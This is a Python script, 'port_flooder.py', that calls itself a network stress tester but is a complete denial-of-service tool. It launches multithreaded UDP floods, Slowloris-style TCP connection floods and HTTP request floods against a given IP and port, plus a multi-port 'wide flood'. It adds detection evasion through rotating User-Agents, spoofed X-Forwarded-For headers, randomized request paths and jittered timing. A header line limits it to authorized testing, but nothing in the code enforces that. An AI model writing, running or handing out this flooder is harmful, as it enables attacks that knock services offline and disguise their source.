#!/usr/bin/env python3
"""
Advanced Network Stress Tester - Evasion Techniques
FOR AUTHORIZED TESTING ONLY - Test only your own servers
"""

import socket
import time
import random
import threading
import requests
import urllib3
from termcolor import cprint
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# User-Agents for evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

# Fake IPs for X-Forwarded-For header
FAKE_IPS = [
    "192.168.1.1", "10.0.0.1", "172.16.0.1", "8.8.8.8", "1.1.1.1",
    "203.0.113.1", "198.51.100.1", "192.0.2.1"
]

class AdvancedFlooder:
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.stats = {'sent': 0, 'failed': 0, 'start_time': None}
    
    def _random_delay(self, base_delay=0):
        """Random delay to avoid patterns"""
        if base_delay > 0:
            delay = base_delay + random.uniform(0, base_delay * 0.5)
            time.sleep(delay)
    
    def _get_http_payload(self, target_ip, target_port):
        """Generate realistic HTTP request with evasion"""
        ua = random.choice(USER_AGENTS)
        fake_ip = random.choice(FAKE_IPS)
        
        paths = ['/', '/index.html', '/wp-admin', '/api/v1/test', '/login', '/search']
        path = random.choice(paths) + f"?_={random.randint(1, 999999)}"
        random_params = f"&x={random.randint(1, 9999)}&t={int(time.time())}"
        
        payload = f"GET {path}{random_params} HTTP/1.1\r\n"
        payload += f"Host: {target_ip}:{target_port}\r\n"
        payload += f"User-Agent: {ua}\r\n"
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        payload += "Accept-Language: en-US,en;q=0.5\r\n"
        payload += "Accept-Encoding: gzip, deflate\r\n"
        payload += "Connection: keep-alive\r\n"
        payload += f"X-Forwarded-For: {fake_ip}\r\n"
        payload += "Cache-Control: no-cache\r\n"
        payload += "\r\n"
        
        return payload.encode()
    
    def _get_udp_payload(self, target_ip, target_port):
        """Generate random UDP payload"""
        payload_types = [
            b'\x00\x01\x00\x00\x00\x00\x00\x01',
            b'GET / HTTP/1.1\r\n',
            b'PING',
            random._urandom(random.randint(32, 256))
        ]
        return random.choice(payload_types)
    
    def udp_attack(self, target_ip, target_port, duration, delay=0):
        """UDP flood attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        timeout = time.time() + duration
        sent = 0
        
        while time.time() < timeout:
            try:
                payload = self._get_udp_payload(target_ip, target_port)
                sock.sendto(payload, (target_ip, target_port))
                sent += 1
                self._random_delay(delay)
            except Exception as e:
                if self.verbose:
                    cprint(f"[!] UDP error: {e}", "red")
                self.stats['failed'] += 1
        
        sock.close()
        
        if self.verbose:
            cprint(f"[✓] UDP Thread finished. Sent: {sent} packets", "green")
        
        return sent
    
    def tcp_attack(self, target_ip, target_port, duration, delay=0):
        """TCP flood with slow connection (Slowloris-like)"""
        timeout = time.time() + duration
        sent = 0
        open_sockets = []
        
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target_ip, target_port))
                
                payload = self._get_http_payload(target_ip, target_port)
                sock.send(payload)
                
                open_sockets.append(sock)
                sent += 1
                self._random_delay(delay)
                
                if len(open_sockets) > 100:
                    for old_sock in open_sockets[:50]:
                        try:
                            old_sock.close()
                        except:
                            pass
                    open_sockets = open_sockets[50:]
                    
            except Exception as e:
                if self.verbose:
                    cprint(f"[!] TCP error: {e}", "red")
                self.stats['failed'] += 1
        
        for sock in open_sockets:
            try:
                sock.close()
            except:
                pass
        
        if self.verbose:
            cprint(f"[✓] TCP Thread finished. Sent: {sent} connections", "green")
        
        return sent
    
    def http_attack(self, target_ip, target_port, duration, delay=0):
        """HTTP flood with realistic requests"""
        timeout = time.time() + duration
        sent = 0
        
        while time.time() < timeout:
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                })
                
                url = f"http://{target_ip}:{target_port}/"
                response = session.get(url, timeout=2, verify=False)
                sent += 1
                self._random_delay(delay)
                
            except Exception as e:
                if self.verbose:
                    cprint(f"[!] HTTP error: {e}", "red")
                self.stats['failed'] += 1
        
        if self.verbose:
            cprint(f"[✓] HTTP Thread finished. Sent: {sent} requests", "green")
        
        return sent
    
    def flood_port(self, target_ip, target_port, threads=50, duration=60, mode="udp", delay=0):
        """Main attack launcher"""
        self.stats['start_time'] = datetime.now()
        
        cprint(f"\n" + "="*60, "red")
        cprint(f"[!] Launching {mode.upper()} Stress Test on {target_ip}:{target_port}", "red", attrs=['bold'])
        cprint(f"[*] Threads: {threads} | Duration: {duration}s | Delay: {delay}s", "cyan")
        cprint("="*60, "red")
        
        thread_list = []
        
        if mode == "udp":
            attack_func = self.udp_attack
        elif mode == "tcp":
            attack_func = self.tcp_attack
        elif mode == "http":
            attack_func = self.http_attack
        else:
            cprint(f"[✗] Unknown mode: {mode}", "red")
            return
        
        for i in range(threads):
            t = threading.Thread(target=attack_func, args=(target_ip, target_port, duration, delay))
            t.daemon = True
            thread_list.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in thread_list:
            t.join()
        
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        cprint(f"\n" + "="*60, "yellow")
        cprint(f"[✓] Stress Test Completed on {target_ip}:{target_port}", "yellow", attrs=['bold'])
        cprint(f"[*] Duration: {elapsed:.1f}s", "cyan")
        cprint("="*60 + "\n", "yellow")
    
    def wide_flood(self, target_ip, threads=10, duration=30, mode="udp"):
        """Multi-port attack"""
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 8080, 8443, 3306, 5432]
        cprint(f"\n[!] Launching WIDE Flood on {len(ports)} ports...", "magenta", attrs=['bold'])
        
        for port in ports:
            cprint(f"[*] Testing port {port}...", "blue")
            threading.Thread(target=self.flood_port, args=(target_ip, port, threads, duration, mode, 0.01)).start()
            time.sleep(0.5)


def flood_port(target_ip, target_port, threads=50, duration=60, mode="udp"):
    """Legacy function for backward compatibility"""
    flooder = AdvancedFlooder(verbose=True)
    flooder.flood_port(target_ip, target_port, threads, duration, mode)


def udp_flood(target_ip, target_port, count, delay):
    """Legacy UDP flood function"""
    flooder = AdvancedFlooder(verbose=True)
    duration = count * delay if delay > 0 else 60
    flooder.udp_attack(target_ip, target_port, duration, delay)


def tcp_flood(target_ip, target_port, count, delay):
    """Legacy TCP flood function"""
    flooder = AdvancedFlooder(verbose=True)
    duration = count * delay if delay > 0 else 60
    flooder.tcp_attack(target_ip, target_port, duration, delay)


def wide_flood(target_ip, count, delay):
    """Legacy wide flood function"""
    flooder = AdvancedFlooder(verbose=True)
    duration = count * delay if delay > 0 else 30
    flooder.wide_flood(target_ip, 10, duration, "udp")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 3:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        mode = sys.argv[3] if len(sys.argv) > 3 else "udp"
        
        flooder = AdvancedFlooder(verbose=True)
        flooder.flood_port(target_ip, target_port, threads=50, duration=30, mode=mode)
    else:
        print("Usage: python port_flooder.py <target_ip> <target_port> <mode>")
        print("Modes: udp, tcp, http")
